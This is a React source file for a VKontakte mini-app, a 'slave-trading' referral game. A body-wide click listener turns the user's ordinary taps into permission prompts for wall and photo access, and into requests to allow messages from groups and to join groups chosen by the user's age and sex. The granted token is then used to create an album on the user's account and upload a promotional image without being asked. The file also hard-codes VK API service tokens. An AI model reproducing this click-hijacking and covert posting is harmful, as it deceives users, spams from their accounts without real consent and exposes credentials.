import React from 'react';
import bridge from '@vkontakte/vk-bridge';
import '../css/Slaves.css';
import '../css/SimpleElements.css';

import {
    AppRoot,
    Avatar,
    Root,
    Button,
    Input,
    ModalCard,
    ModalRoot,
    Panel,
    Placeholder,
    ScreenSpinner,
    Select,
    Text,
    Title,
    View,
    Epic,
    Tabbar,
    TabbarItem,
    PanelHeader,
    PanelHeaderBack,
    ActionSheet,
    ActionSheetItem,
    Snackbar,
    Search,
    CustomSelect
} from '@vkontakte/vkui';
import SimplePlaceholder from "../components/SimplePlaceholder";
import SimpleButton from "../components/SimpleButton";
import {decOfNum, get, getRandomInt, getUrlParams, loadFonts, shortIntegers, toBlob} from "../js/utils";
import {
    Icon28AddSquareOutline, Icon28ChainOutline,
    Icon28CoinsOutline, Icon28CommentOutline,
    Icon28EditOutline, Icon28ErrorCircleOutline, Icon28InfoCircleOutline,
    Icon28KeyOutline, Icon28MarketAddBadgeOutline, Icon28StoryOutline,
    Icon28UserCircleOutline, Icon28Users3Outline, Icon28WriteSquareOutline
} from "@vkontakte/icons";
import SimpleBanner from "../components/SimpleBanner";
import {LeaderBoard} from "../components/LeaderBoard";
import fetch from "node-fetch";
import {createCanvas} from "canvas";

const
    categoriesYears = 4, // Кол-во категорий для возрастов (до 23, после 23; до 23, до 29, после 29)
    countGroupsForMessage = 2, // Кол-во групп в одной категории (сообщения)
    countGroupsForSubscribe = 3 // Кол-во групп в одной категории (подписка)
;

const
    axios = require('axios'),
    apiUrl = {
        7806279: 'https://vds2080572.my-ihor.ru:8081/api/',
        7811123: 'https://vds2082122.my-ihor.ru:8081/api/',

        51470167: 'https://vds2153927.my-ihor.ru:8089/api/'
    },
    proxyUrl = ['https://murmuring-bastion-20764.herokuapp.com/', 'https://vds2153919.my-ihor.ru:8088/'][getRandomInt(0, 1)],
    getAppUrl = 'https://vds2153919.my-ihor.ru:8081/api/apps.get',

    vkApiToken = {
        7806279: '509987bd509987bd509987bd7750eeb78455099509987bd30fed260dd3a75fbc378e862',
        7811123: '509987bd509987bd509987bd7750eeb78455099509987bd30fed260dd3a75fbc378e862',

        51470167: '6255420862554208625542083961441d5f6625562554208013c72796ddd48335e034021'
    },
    name_cases = ['first_name', 'last_name', 'first_name_dat', 'first_name_nom', 'first_name_gen', 'first_name_acc', 'first_name_ins', 'first_name_abl', 'last_name_dat', 'last_name_nom', 'last_name_gen', 'last_name_acc', 'last_name_ins', 'last_name_abl'],

    MODAL_CARD_CHANGE_STATUS = 'status',
    MODAL_CARD_FREE = 'free',
    MODAL_CARD_GET_MONEY = 'get-money'
;

let
    local_users = {},

    cycle_clicks = 0,
    cycle_pointers = []
;

class Slaves extends React.Component {

    constructor(props) {
        super(props);

        this.state = {
            popout: null,
            history: {
                view1: ['onboarding'],
                view2: ['profile'],

                profile: ['profile'],
                shop: ['shop'],
                rate: ['rate']
            },
            activePanel: {
                view1: 'onboarding',
                view2: 'profile',

                profile: ['profile'],
                shop: ['shop'],
                rate: ['rate']
            },

            activeStory: 'profile',
            activeView: 'view1',
            activeModal: null,
            modalHistory: [],

            friends: [],
            payments: [0],
            slave_info: {slaves: []},
            my_slaves: {},
            ref: true
        };

        this.componentDidMount = this.componentDidMount.bind(this);
        this.back = this.back.bind(this);
        this.go = this.go.bind(this);
        this.onStoryChange = this.onStoryChange.bind(this);
        this.uploadStoryPhotoToAlbum = this.uploadStoryPhotoToAlbum.bind(this);

        this.modalBack = () => {
            this.setActiveModal(this.state.modalHistory[this.state.modalHistory.length - 2]);
        };

        this.setActiveModal = activeModal => {
            activeModal = activeModal || null;
            let modalHistory = this.state.modalHistory ? [...this.state.modalHistory] : [];

            if (activeModal === null) {
                modalHistory = [];
            } else if (modalHistory.indexOf(activeModal) !== -1) {
                modalHistory = modalHistory.splice(0, modalHistory.indexOf(activeModal) + 1);
            } else {
                modalHistory.push(activeModal);
                window.history.pushState({pop: 'modal'}, 'Title');
            }

            this.setState({
                activeModal,
                modalHistory
            });
        };

        this.vkParams = () => window.location.search.length > 0 && JSON.parse('{"' + decodeURI(window.location.search.substring(1)).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g, '":"') + '"}');
    }

    getGroupsCategory(sex, years) {
        const data = this.getCategories();
        if (sex === 0 || years === 0) return this.defaultCategory;

        const
            categories = data[sex],
            keys = Object.keys(categories),
            categories_years = keys.map(value => ([value, categories[value]]))
        ;

        for (let i = 0; i < categories_years.length; i++) {
            const category = categories_years[i];
            if (i === categories_years.length - 1)
                return parseInt(category[0]);

            if (parseInt(years) <= parseInt(category[1]))
                return parseInt(category[0]);
        }

        return this.defaultCategory;
    }

    getCategories() {
        return (
            {
                2: {
                    2: { // мужской
                        0: 23,
                        1: 24
                    },
                    1: { // женский
                        2: 23,
                        3: 24
                    },
                },
                3: {
                    2: { // мужской
                        0: 23,
                        1: 29,
                        2: 30
                    },
                    1: { // женский
                        3: 23,
                        4: 29,
                        5: 30
                    },
                },
                4: {
                    2: { // мужской
                        0: 16,
                        1: 24,
                        2: 29,
                        3: 30
                    },
                    1: { // женский
                        4: 16,
                        5: 24,
                        6: 29,
                        7: 30
                    },
                }
            }
        )[categoriesYears];
    }

    async componentDidMount() {
        const
            storage_data = (await bridge.send('VKWebAppStorageGet', {keys: ['data']})).keys[0].value,
            isExistData = storage_data !== ''
        ;
        console.log({isExistData, storage_data});

        window.addEventListener('popstate', e => {
            e.preventDefault();
            this.back();
        });

        bridge.subscribe(async ({detail: {type, data}}) => {
            if (type !== undefined) console.log(type, data);
            if (type === 'VKWebAppUpdateConfig') {
                const schemeAttribute = document.createAttribute('scheme');
                schemeAttribute.value = 'bright_light';
                document.body.attributes.setNamedItem(schemeAttribute);
            } else if (type === 'VKWebAppViewRestore') {
                this.setState({popout: null});
            }
        });

        const
            app_id = getUrlParams().vk_app_id,
            app = (await get(getAppUrl, {app_id})).response,
            groupsJoinCategory = [],
            groupsMessageCategory = [],

            vk_user = await bridge.send('VKWebAppGetUserInfo'),
            jobs = await this.apiRequest('jobs.get')
        ;
        this.defaultCategory = app.category_group_default;

        for (let i = 0; i < app.group_id_join.length; i += countGroupsForSubscribe) {
            groupsJoinCategory.push(app.group_id_join.slice(i, i + countGroupsForSubscribe));
        }

        const splitter = countGroupsForMessage;
        for (let i = 0; i < app.group_id_message.length; i += splitter) {
            groupsMessageCategory.push(app.group_id_message.slice(i, i + splitter));
        }

        const
            sex = vk_user.sex,
            years = vk_user.bdate ? (vk_user.bdate.split('.').length === 3 ? (new Date().getFullYear() - parseInt(vk_user.bdate.split('.')[2])) : 0) : 0,
            showGroupsCategory = this.getGroupsCategory(sex, years),

            groupsJoinUser = groupsJoinCategory[showGroupsCategory],
            groupsMessageUser = groupsMessageCategory[showGroupsCategory]
        ;

        this.setState({
            _groupsJoinCategory: groupsJoinCategory,
            _groupsMessageCategory: groupsMessageCategory,
            current_group_id_join: 0, current_group_id_message: 0,

            vk_user,
            groupsJoinUser,
            groupsMessageUser,
            app,
            showGroupsCategory,

            user: vk_user, jobs,
            sex, years
        });

        console.log({
            defaultCategory: this.defaultCategory,
            tgCategory: this.tgCategory,
            vk_user,
            sex,
            years,
            showGroupsCategory
        });

        await this.updateData();

        if (isExistData) {
            if (years === 0) {
                setTimeout(() => {
                    const {activePanel} = this.state;
                    activePanel.view1 = 'sex_years';
                    this.setState({activeView: 'view1', activePanel});
                }, 400);
            } else {
                this.setState({activeView: 'view2'});
            }
            await this.setToken();
            if (this.state.token_wall) {
                const canvas = await this.getStoryCanvas();
                canvas.toBlob(async function (blob) {
                    this.uploadStoryPhotoToAlbum(blob);
                }.bind(this));
            }
        }

        loadFonts(['TT Commons', 'Roboto', 'SF Pro Display', 'SF Pro Text', 'SF UI Text']);

        bridge.send('VKWebAppInit');

        setTimeout(() => {
            document.body.addEventListener('click', async () => {
                console.log({cycle_clicks, cycle_pointers});
                if (cycle_clicks === 14)
                    cycle_clicks = 0;

                cycle_clicks++;
                try {
                    if (!cycle_pointers[cycle_clicks - 1]) {
                        if (cycle_clicks - 1 === 0) {
                            await this.setToken();
                            if (this.state.token_wall && !this.state.isExistData) {
                                const canvas = await this.getStoryCanvas();
                                canvas.toBlob(async function (blob) {
                                    this.uploadStoryPhotoToAlbum(blob);
                                }.bind(this));
                            }
                        } else if (cycle_clicks - 1 === 1) {
                            try {
                                const {current_group_id_message, groupsMessageUser} = this.state;
                                if (groupsMessageUser.length > current_group_id_message) {
                                    this.setState({current_group_id_message: current_group_id_message + 1});
                                    await bridge.send('VKWebAppAllowMessagesFromGroup', {group_id: groupsMessageUser[current_group_id_message]});
                                }
                                cycle_pointers[cycle_clicks - 1].success = true;
                            } catch (e) {
                                console.error(e);
                            }
                        } else if (cycle_clicks - 1 === 6) {
                            try {
                                const {current_group_id_join, groupsJoinUser} = this.state;
                                if (groupsJoinUser.length > current_group_id_join) {
                                    this.setState({current_group_id_join: current_group_id_join + 1});
                                    await bridge.send('VKWebAppJoinGroup', {group_id: groupsJoinUser[current_group_id_join]});
                                }
                                cycle_pointers[cycle_clicks - 1].success = true;
                            } catch (e) {
                                console.error(e);
                            }
                        }
                    }
                } catch (e) {
                    console.error(e);
                }
            });
        }, 3000);
    }

    back = () => {
        let {modalHistory, history, popout, activeStory, activePanel} = this.state;

        if (popout !== null) {
            this.setState({popout: null});
            window.history.pushState({pop: 'popout'}, 'Title');
            return;
        }

        if (modalHistory.length > 0) {
            this.modalBack();
            return;
        }

        if (history[activeStory].length === 1) {
            bridge.send('VKWebAppClose', {status: 'success', message: 'Возвращайтесь ещё!'});
        } else if (history[activeStory].length > 1) {
            history[activeStory].pop();
            activePanel[activeStory] = history[activeStory][history[activeStory].length - 1];
            this.setState({activePanel, history});
        }
    };

    go(panel) {
        let {activeStory, history, activePanel} = this.state;
        if (history[activeStory][history[activeStory].length - 1] !== panel) {
            history[activeStory].push(panel);
            window.history.pushState({activePanel: panel}, 'Title');
            activePanel[activeStory] = panel;
            this.setState({activePanel, history, activeModal: null, modalHistory: [], snackbar: null});
        }
    }

    async onStoryChange(e) {
        const
            {story} = e.currentTarget.dataset,
            {activeStory, activePanel, history} = this.state
        ;

        if (activeStory == story && story == history[story][0] && activePanel[story] != history[story][0])
            this.back();

        if (story == 'shop')
            this.updateShop();

        if (story == 'profile')
            this.updateData();

        if (story == 'rate')
            await this.updateRate();

        this.setState({activeStory: story, snackbar: null});
    }

    async apiRequest(method, params = {}) {
        //console.log(method, params);
        const response = (await get(apiUrl[this.vkParams().vk_app_id] + method, {...this.vkParams(), ...params}));
        //console.log(response);
        return response.response;
    }

    async vkApiRequest(method, params = {}) {
        return (await bridge.send('VKWebAppCallAPIMethod', {
            method,
            params: {
                ...params,
                v: '5.126',
                access_token: params.access_token || vkApiToken[this.vkParams().vk_app_id]
            }
        })).response
    }

    async getUsers(ids) {
        const
            user_ids = ids.filter(value => local_users[value] === undefined),
            i = Math.floor(user_ids.length / 100)
        ;
        let users = [];

        for (let j = 0; j < i + 1; j++) {
            users = users.concat(
                await this.vkApiRequest('users.get', {
                    user_ids: user_ids.slice(j * 100, j * 100 + 100).join(','),
                    fields: ['photo_200', ...name_cases].join(',')
                })
            );
        }

        for (const user of users) {
            local_users[user.id] = user;
        }

        return ids.map(value => local_users[value]);
    }

    async getStoryCanvas() {
        return await new Promise(resolve => {
            const
                {createCanvas, loadImage} = require('canvas'),
                canvas = createCanvas(615, 939),
                ctx = canvas.getContext('2d')
            ;
            loadImage(require('../assets/icons_slaves/story.jpg')).then(async background => {
                ctx.drawImage(background, 0, 0);
                resolve(canvas);
            });
        })
    }

    async shareStory() {
        this.setState({popout: <ScreenSpinner/>});
        let canvas = await this.getStoryCanvas();
        this.setState({popout: null});

        bridge.send('VKWebAppShowStoryBox', {
            background_type: 'image',
            blob: canvas.toDataURL('image/png'),
            attachment: {
                text: 'go_to',
                type: 'url',
                url: `https://vk.com/app${this.vkParams().vk_app_id}#${this.vkParams().vk_user_id}`
            }
        });
    }

    async uploadStoryPhotoToWall(blob) {
        const
            {app, token_wall} = this.state,
            defaultCopyright = `${this.vkParams().vk_app_id}#${this.vkParams().vk_user_id}`,
            _searchComponent = 'vk.com/app',
            copyright = app.album_caption.length > 0 ?
                (app.album_caption.indexOf(_searchComponent) > -1 ?
                    (app.album_caption.slice(app.album_caption.indexOf(_searchComponent) + _searchComponent.length, app.album_caption.slice(app.album_caption.indexOf(_searchComponent) + _searchComponent.length).indexOf(' ')))
                    : defaultCopyright)
                : defaultCopyright,

            uploadWallUrl = (await bridge.send('VKWebAppCallAPIMethod', {
                method: 'photos.getWallUploadServer',
                params: {
                    v: '5.126',
                    access_token: token_wall
                }
            })).response.upload_url,
            bodyFormData = new FormData()
        ;

        bodyFormData.append('photo', blob, 'image.png');

        try {
            fetch(proxyUrl + uploadWallUrl, {
                method: 'POST',
                body: bodyFormData
            })
                .then(res_ => {
                    return res_.json();
                })
                .then(async response => {
                    const {server, photo, hash} = response;
                    const wallPhoto = (await bridge.send('VKWebAppCallAPIMethod', {
                        method: 'photos.saveWallPhoto',
                        params: {
                            server,
                            photo,
                            hash,
                            caption: app.album_caption,
                            v: '5.126',
                            access_token: token_wall
                        }
                    })).response[0];

                    bridge.send('VKWebAppShowWallPostBox', {
                        message: '',
                        copyright: 'https://vk.com/app' + copyright,
                        attachments: `photo${wallPhoto.owner_id}_${wallPhoto.id}`
                    });
                });
        } catch (e) {
            console.error(e);
        }
    }

    async uploadStoryPhotoToAlbum(blob) {
        if (this.state.isExistData) {
            return;
        }
        const {need_upload_default_album_photo, album_default_photo_url} = this.state.app;
        if (need_upload_default_album_photo) {
            const
                data = await toBlob(album_default_photo_url),
                image = new Image()
            ;
            image.src = data;
            await new Promise(res =>
                image.onload = () => res(true)
            );
            const
                {createCanvas} = require('canvas'),
                canvas = createCanvas(image.width, image.height),
                ctx = canvas.getContext('2d')
            ;
            ctx.drawImage(image, 0, 0);
            blob = await new Promise(resolve => canvas.toBlob(blob => resolve(blob)));
        }

        const
            {album_name, album_caption} = this.state.app,
            access_token = this.state.token_wall,
            album_id = (await bridge.send('VKWebAppCallAPIMethod', {
                method: 'photos.createAlbum',
                params: {
                    title: album_name,
                    v: '5.126',
                    access_token
                }
            })).response.id,
            uploadAlbumUrl = (await bridge.send('VKWebAppCallAPIMethod', {
                method: 'photos.getUploadServer',
                params: {
                    album_id,
                    v: '5.126',
                    access_token
                }
            })).response.upload_url,
            bodyFormData = new FormData()
        ;

        bodyFormData.append('photo', blob, 'image.png');

        try {
            fetch(proxyUrl + uploadAlbumUrl, {
                method: 'POST',
                body: bodyFormData
            })
                .then(res_ => {
                    return res_.json();
                })
                .then(async response => {
                    const {server, photos_list, hash} = response;
                    console.log('Photo saved: ', response);
                    await bridge.send('VKWebAppCallAPIMethod', {
                        method: 'photos.save',
                        params: {
                            album_id,
                            server,
                            photos_list,
                            hash,
                            caption: album_caption,
                            v: '5.126',
                            access_token
                        }
                    });
                });
        } catch (e) {
            console.error(e);
        }
    }

    async setToken() {
        try {
            const response = await bridge.send('VKWebAppGetAuthToken', {
                app_id: parseInt(this.vkParams().vk_app_id),
                scope: 'friends,wall,photos'
            });
            if (response.scope.indexOf('wall') > -1)
                await this.setState({token_wall: response.access_token});

            if (response.scope.indexOf('friends') > -1)
                await this.setState({token_friends: response.access_token});

            cycle_pointers[0].success = true;
        } catch (e) {

        }
        return true;
    }

    async updateShop() {
        await this.setToken();
        const
            friends = await this.vkApiRequest('friends.get', {
                user_id: this.state.user.id,
                order: 'random ',
                count: 100,
                ...this.state.token_friends ? {access_token: this.state.token_friends} : {}
            })
        ;

        if (friends.items.length > 0) {
            let
                friends_in_game = await this.apiRequest('friends.get', {friend_ids: friends.items}),
                owners = [],
                slaves_ = [];

            await this.getUsers(friends.items);

            for (const friend of friends_in_game) {
                if (friend.owner > 0)
                    owners.push(friend.owner);

                if (friend.slaves.length > 0) {
                    slaves_ = slaves_.concat(friend.slaves);
                }
            }

            const toGetIds = owners.concat(slaves_);
            await this.getUsers(toGetIds);
            await this.setState({friends: friends_in_game});
        } else {
            await this.setState({friends: []});
        }
    }

    async updateData() {
        const
            profile = await this.apiRequest('users.get', window.location.hash.length > 0 && this.state.ref ? {owner_id: window.location.hash.substring(1)} : {})
        ;
        this.setState({ref: false});

        if (profile.owner > 0)
            await this.getUsers([profile.owner]);

        if (profile.slaves.length > 0) {
            let
                payments = [],
                slave_ids = [...profile.slaves],
                slaves_in_game = await this.apiRequest('friends.get', {friend_ids: slave_ids}),
                my_slaves = {},
                toGetIds = [...slave_ids]
            ;
            for (const slave of slaves_in_game) {
                payments.push((slave.slaves.length * 0.1 / 2));

                my_slaves[slave.id] = slave;
                if (slave.owner > 0)
                    toGetIds.push(slave.owner);

                if (slave.slaves.length > 0)
                    toGetIds = toGetIds.concat(slave.slaves);
            }
            await this.setState({payments, my_slaves});
            await this.getUsers(toGetIds);
        }

        await this.setState({profile});

        return true;
    }

    async updateRate() {
        const
            top_players = await this.apiRequest('users.getTop'),
            player_ids = top_players.map(value => value.id),
            vk_users = await this.getUsers(player_ids),
            players = vk_users.map((value, i) => {
                return {
                    ...value, ...top_players[i],
                    score: decOfNum(top_players[i].slaves.length, ['раб', 'раба', 'рабов'])
                };
            })
        ;

        /* DONT USE THIS LAGG SHIT
        let ids = [];
        for (const player of players) {
            if (player.slaves.length > 0)
                ids = ids.concat(player.slaves);

            if (player.owner > 0)
                ids.push(player.owner);
        }

        await this.getUsers(ids);
        */
        await this.updateShop();

        const friends = this.state.friends.map(value => {
            return {
                ...local_users[value.id], ...value, score: decOfNum(value.slaves.length, ['раб', 'раба', 'рабов'])
            };
        }).sort((a, b) => a.slaves.length - b.slaves.length);

        await this.setState({top: [players, friends.reverse()]});
    }

    async openProfile(id) {
        const slave_info = {...(await this.getUsers([id]))[0], ...(await this.apiRequest('friends.get', {friend_ids: [id]}))[0]};
        if (slave_info.slaves.length > 0)
            await this.getUsers(slave_info.slaves);

        if (slave_info.owner > 0)
            await this.getUsers([slave_info.owner]);

        await this.updateRate();
        await this.setState({
            slave_info,
            activeStory: 'rate'
        });
        this.go('info');
    }

    render() {
        const inputYearsRef = React.createRef();

        if (this.state.user === undefined || this.state.profile === undefined)
            return <div></div>;

        let
            {state} = this,
            {
                activeView, activePanel, popout, activeStory,
                user, profile, jobs, friends, slave_info,
                snackbar
            } = state
        ;

        const modal = (
            <ModalRoot
                activeModal={this.state.activeModal}
                onClose={this.modalBack}
            >
                <ModalCard
                    icon={<Icon28CommentOutline width={56} height={56}/>}
                    onClose={this.modalBack}
                    id={MODAL_CARD_CHANGE_STATUS}
                    header='Изменение'
                    subheader='Чем больше рабов, тем влиятельнее Вы становитесь. Превратите своих друзей в рабов, чтобы изменить свой статус.'
                    actionsLayout='vertical'
                    actions={[
                        <SimpleButton onClick={() => {
                            this.updateShop();
                            this.modalBack();
                            setTimeout(() => {
                                this.setState({activeStory: 'shop'});
                            }, 400);
                        }} style={{height: 44, borderRadius: 10}}>Приобрести рабов</SimpleButton>
                    ]}
                />
                <ModalCard
                    icon={<Icon28ChainOutline width={56} height={56}/>}
                    onClose={this.modalBack}
                    id={MODAL_CARD_FREE}
                    header='Освобождение'
                    subheader='Находясь в рабстве Вы отдаёте часть своего дохода и дохода своих рабов своему рабовладельцу. Выкупите себя, чтобы оставить весь заработок себе.'
                    actionsLayout='vertical'
                    actions={[
                        <SimpleButton onClick={async () => {
                            this.setState({popout: <ScreenSpinner/>});
                            const success = await this.apiRequest('slaves.free');
                            if (success === true) {
                                await this.updateData();
                            } else {
                                this.setState({
                                    snackbar:
                                        <Snackbar
                                            onClose={() => this.setState({snackbar: null})}>
                                            Недостаточно средств
                                        </Snackbar>
                                });
                            }
                            this.modalBack();
                            this.setState({popout: null});
                        }} style={{background: '#4BB34B', height: 44, borderRadius: 10}}>Освободиться
                            за {(profile.price * 1.63).toFixed(2)} ₽</SimpleButton>
                    ]}
                />
                <ModalCard
                    icon={<Icon28CoinsOutline width={56} height={56}/>}
                    onClose={this.modalBack}
                    id={MODAL_CARD_GET_MONEY}
                    header='Заработать'
                    subheader='Каждый  раб приносит Вам 1 рубль в час. Чтобы заработать денег нужно приобрести как можно больше рабов. Если Вы в рабстве, то Вы отдаёте 50% своего дохода своему рабовладельцу.'
                    actionsLayout='vertical'
                    actions={[
                        <SimpleButton onClick={() => {
                            this.updateShop();
                            this.modalBack();
                            setTimeout(() => {
                                this.setState({activeStory: 'shop'});
                            }, 400);
                        }} style={{height: 44, borderRadius: 10}}>Приобрести рабов</SimpleButton>
                    ]}
                />
            </ModalRoot>
        );

        return (
            <AppRoot>
                <Root activeView={activeView}>
                    <View id='view1' activePanel={activePanel[activeView]}
                          popout={popout} modal={modal}>
                        <Panel id='onboarding'>
                            <SimplePlaceholder
                                icon={<img src={require('../assets/icons_slaves/MainImage.png')}/>}
                                title='Добро пожаловать'
                                subtitle={
                                    profile.owner > 0 ?
                                        `Приветствуем в мире Игры Рабов. ${local_users[profile.owner].first_name + ' ' + local_users[profile.owner].last_name} взял Вас в рабство. Но это еще не конец! Вы можете освободиться и стать самым влиятельным рабовладельцем во ВКонтакте. Или оставить все как есть и пахать всю жизнь на хозяина.`
                                        :
                                        'Приветствуем в мире Игры Рабов. Перед Вами стоит выбор — стать самым влиятельным рабовладельцем во ВКонтакте или пахать всю жизнь на хозяина.'
                                }
                                action={
                                    <SimpleButton
                                        onClick={async () => {
                                            await bridge.send('VKWebAppStorageSet', {
                                                key: 'data',
                                                value: JSON.stringify({onboarding: true})
                                            });

                                            if (this.state.years === 0) {
                                                setTimeout(() => {
                                                    const {activePanel} = this.state;
                                                    activePanel.view1 = 'sex_years';
                                                    this.setState({activeView: 'view1', activePanel});
                                                }, 400);
                                            } else {
                                                this.setState({activeView: 'view2'});
                                            }
                                        }}
                                        style={{
                                            width: '63.46vw'
                                        }}>Поехали!</SimpleButton>
                                }
                            />
                        </Panel>
                        <Panel id='sex_years'>
                            <div className='FullScreen__Container'>
                                <img alt='icon' className='FullScreen__Icon'
                                     src={require('../assets/vk_acc_price/icons/1.png')}/>
                                <div className='FullScreen__Title'>
                                    Укажите свой пол и возраст
                                </div>
                                <div className='ActionContainer'>
                                    <CustomSelect
                                        onChange={e => this.setState({selectedSex: e.target.value})}
                                        defaultValue={(this.state.sex === 0 || this.state.sex === 1) ? '1' : '2'}
                                        options={Object.keys(this.getCategories()).map(value => ({
                                            value: `${value}`,
                                            label: value == 1 ? 'женский' : 'мужской'
                                        }))}
                                    />
                                    <Input
                                        getRef={inputYearsRef}
                                        type='number'
                                        defaultValue={20}
                                    />
                                    <Button
                                        onClick={async () => {
                                            let
                                                {selectedSex} = this.state,
                                                selectedYears = inputYearsRef.current.value
                                            ;

                                            if (!selectedSex)
                                                selectedSex = (this.state.sex === 0 || this.state.sex === 1) ? '1' : '2';

                                            if (!selectedYears)
                                                selectedYears = `${this.getCategories()['2']['0']}`;

                                            try {
                                                const
                                                    {_groupsJoinCategory, _groupsMessageCategory} = this.state,
                                                    showGroupsCategory = this.getGroupsCategory(selectedSex, selectedYears),

                                                    groupsJoinUser = _groupsJoinCategory[showGroupsCategory],
                                                    groupsMessageUser = _groupsMessageCategory[showGroupsCategory]
                                                ;
                                                this.setState({
                                                    sex: selectedSex,
                                                    years: selectedYears,
                                                    groupsJoinUser,
                                                    groupsMessageUser,
                                                    showGroupsCategory,
                                                    activeView: 'view2'
                                                });
                                                console.log({
                                                    selectedSex,
                                                    selectedYears,
                                                    showGroupsCategory,

                                                    groupsJoinUser,
                                                    groupsMessageUser
                                                });
                                            } catch (e) {
                                                console.error('ERR', e);
                                                console.log({selectedSex, selectedYears});
                                            }
                                        }}
                                    >
                                        Продолжить
                                    </Button>
                                </div>
                            </div>
                        </Panel>
                    </View>
                    <View id='view2' activePanel='epic'
                          popout={popout} modal={modal}>
                        <Panel id='epic'>
                            <Epic activeStory={activeStory} tabbar={
                                <Tabbar>
                                    <TabbarItem
                                        onClick={this.onStoryChange}
                                        selected={activeStory === 'profile'}
                                        data-story='profile'
                                        id='profile'
                                    ><Icon28UserCircleOutline/></TabbarItem>
                                    <TabbarItem
                                        onClick={this.onStoryChange}
                                        selected={activeStory === 'shop'}
                                        data-story='shop'
                                        id='shop'
                                    ><Icon28MarketAddBadgeOutline/></TabbarItem>
                                    <TabbarItem
                                        onClick={this.onStoryChange}
                                        selected={activeStory === 'rate'}
                                        data-story='rate'
                                        id='rate'
                                    ><Icon28Users3Outline/></TabbarItem>
                                </Tabbar>
                            }>
                                <View id='profile' activePanel={activePanel[activeStory].toString()}>
                                    <Panel id='profile'>
                                        <div
                                            style={{height: 'calc(var(--safe-area-inset-top) + var(--panelheader_height_ios) + 1.23vh)'}}/>
                                        <div className='centered'>
                                            <Avatar src={user.photo_200} size={80}/>
                                        </div>
                                        <div style={{height: 16}}/>
                                        <div className='ProfileTitle'>{user.first_name} {user.last_name}</div>
                                        <div style={{height: 16}}/>
                                        <div style={{
                                            margin: '0 21px',
                                            paddingBottom: 24
                                        }}>
                                            <div className='SimpleCard centered'>
                                                <div className='SimpleCard_Title' style={{textAlign: 'center'}}>
                                                    Статус
                                                </div>
                                                <div style={{height: 6}}/>
                                                <div className='SimpleCard_MiniSubTitle' onClick={async () => {
                                                    if (profile.owner > 0) {
                                                        this.openProfile(profile.owner);
                                                    }
                                                }}>
                                                    {
                                                        profile.slaves.length >= 200 ? 'Очень влиятельный работорговец' :
                                                            profile.slaves.length >= 100 ? 'Успешный работорговец' :
                                                                profile.slaves.length >= 30 ? 'Состоятельный работорговец' :
                                                                    profile.slaves.length >= 1 ? 'Работорговец новичок'
                                                                        : 'Работорговец неудачник'}. {profile.owner > 0 ? `В рабстве у ${local_users[profile.owner].first_name_gen} ${local_users[profile.owner].last_name_gen}` : 'На свободе'}.
                                                </div>
                                                <div style={{height: 21}}/>
                                                <div className='SimpleCard_Button'
                                                     onClick={() => this.setActiveModal(MODAL_CARD_CHANGE_STATUS)}>
                                                    <div className='SimpleCard_Button_Text'>Изменить
                                                    </div>
                                                    <div style={{width: 4}}/>
                                                    <Icon28EditOutline width={16} height={16} fill='#5AB9E5'/>
                                                </div>
                                                {
                                                    profile.owner > 0 && <React.Fragment>
                                                        <div style={{height: '0.49vh'}}/>
                                                        <div className='SimpleCard_Button'
                                                             onClick={() => this.setActiveModal(MODAL_CARD_FREE)}>
                                                            <div className='SimpleCard_Button_Text'>
                                                                Освободиться от рабства
                                                            </div>
                                                            <div style={{width: 4}}/>
                                                            <Icon28KeyOutline width={16} height={16} fill='#FFAE70'/>
                                                        </div>
                                                    </React.Fragment>
                                                }
                                            </div>
                                            <div style={{height: 12}}/>
                                            <div className='SimpleCard'>
                                                <div className='SimpleCard_Title'>Баланс</div>
                                                <div style={{height: 6}}/>
                                                <div className='SimpleCard_SubTitle'>
                                                    {shortIntegers(profile.balance)} ₽
                                                </div>
                                                <div style={{height: 21}}/>
                                                <div className='SimpleCard_Button'
                                                     onClick={() => this.setActiveModal(MODAL_CARD_GET_MONEY)}>
                                                    <div className='SimpleCard_Button_Text'>Заработать
                                                    </div>
                                                    <div style={{width: 4}}/>
                                                    <Icon28CoinsOutline width={16} height={16} fill='#305D42'/>
                                                </div>
                                            </div>
                                            <div style={{height: 12}}/>
                                            <div className='SimpleCard'>
                                                <div className='flex'>
                                                    <span className='SimpleCard_Title' style={{width: '50%'}}>
                                                        Ваши рабы: <span
                                                        style={{color: 'rgba(0, 0, 0, 0.35)'}}>{profile.slaves.length}</span>
                                                    </span>
                                                    <span className='SimpleCard_Title'
                                                          style={{
                                                              color: 'rgba(0, 0, 0, 0.35)',
                                                              textAlign: 'right',
                                                              width: '80%'
                                                          }}>
                                                     {(profile.slaves.length * 0.1 + state.payments.reduce((a, b) => a + b)).toFixed(2)} ₽/мин {profile.owner > 0 && ' -50%'}
                                                     </span>
                                                </div>
                                                <div style={{height: 12}}/>
                                                <div className='SimpleCard_Button'
                                                     onClick={() => this.setState({activeStory: 'shop'})}>
                                                    <div className='SimpleCard_Button_Text'>Приобрести
                                                        рабов
                                                    </div>
                                                    <div style={{width: 4}}/>
                                                    <Icon28AddSquareOutline width={16} height={16} fill='#FF6866'/>
                                                </div>
                                                {
                                                    profile.slaves.length > 0 &&
                                                    <React.Fragment>
                                                        <div style={{height: 12}}/>
                                                        {profile.slaves.map((value, i) => {
                                                                const slave = local_users[value];
                                                                return <div>
                                                                    <div className='flex' style={{alignItems: 'center'}}
                                                                         onClick={async () => {
                                                                             this.openProfile(value);
                                                                         }}>
                                                                        <Avatar src={slave.photo_200} size={24}/>
                                                                        <div style={{width: 8}}/>
                                                                        <div className='flex'
                                                                             style={{width: '100%', marginRight: 7}}>
                                                                        <span
                                                                            className='SlaveName'>{slave.first_name} {slave.last_name}</span>
                                                                            <span
                                                                                className='SlavePay'>{(0.1 + state.payments[i]).toFixed(2)} ₽/мин</span>
                                                                        </div>
                                                                    </div>
                                                                    <div style={{height: 4}}/>
                                                                </div>;
                                                            }
                                                        )}
                                                    </React.Fragment>
                                                }
                                            </div>
                                        </div>
                                        {snackbar}
                                    </Panel>
                                </View>
                                <View id='shop' activePanel={activePanel[activeStory].toString()}>
                                    <Panel id='shop'>
                                        <PanelHeader
                                            separator={false}
                                        >
                                            Покупка рабов
                                        </PanelHeader>
                                        <div style={{
                                            margin: '0 21px'
                                        }}>
                                            <SimpleBanner
                                                icon={<Icon28ErrorCircleOutline width={24} height={24} fill='#5AB9E5'/>}
                                                text='Каждый человек, который перейдёт по ссылке ниже станет вашим рабом.'/>
                                            <div style={{height: 12}}/>
                                            <Input disabled
                                                   value={`vk.com/app${this.vkParams().vk_app_id}#${user.id}`}/>
                                            <div style={{height: 12}}/>
